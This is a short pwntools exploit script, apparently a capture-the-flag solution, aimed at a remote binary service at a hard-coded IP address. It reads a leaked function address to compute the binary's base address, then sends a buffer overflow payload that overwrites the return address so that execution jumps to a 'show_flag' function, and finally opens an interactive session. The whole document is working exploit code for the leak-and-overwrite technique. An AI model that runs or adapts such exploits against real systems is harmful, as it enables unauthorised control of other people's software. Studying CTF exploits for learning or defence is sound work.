from pwn import *

elf = ELF("./vuln")
#io = process("./vuln")
io = remote("35.200.120.35", "9003")
# leak cry function address
io.recvuntil("cry()   | ")
cry_addr = int(io.recvuntil(" ").strip(), 16)
# calc binary base address
bin_baseaddr = cry_addr - elf.symbols["my_monster_cry"]
# build show_flag function address
SHOW_FLAG = bin_baseaddr + elf.symbols["show_flag"]

payload = b""
payload += b"A"*0x10 + b"B"*0x10
payload += p64(SHOW_FLAG)
io.sendafter("Input name: ", payload)
io.interactive()
